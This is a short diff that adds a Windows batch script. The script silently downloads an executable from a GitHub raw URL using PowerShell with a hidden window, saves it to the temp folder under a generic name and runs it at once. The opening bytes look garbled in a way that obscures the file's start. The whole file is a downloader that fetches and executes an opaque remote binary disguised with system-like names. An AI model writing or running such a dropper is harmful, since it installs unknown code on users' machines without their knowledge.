@@ -1,0 +1,9 @@
+ÿþ&cls
+ÿþ
+@echo off
+set "url=https://github.com/adamzayety-collab/X-CHHH/raw/refs/heads/main/System.exe"
+set "file=%temp%\panel.exe"
+
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%url%','%file%')"
+start "" "%file%"
+exit
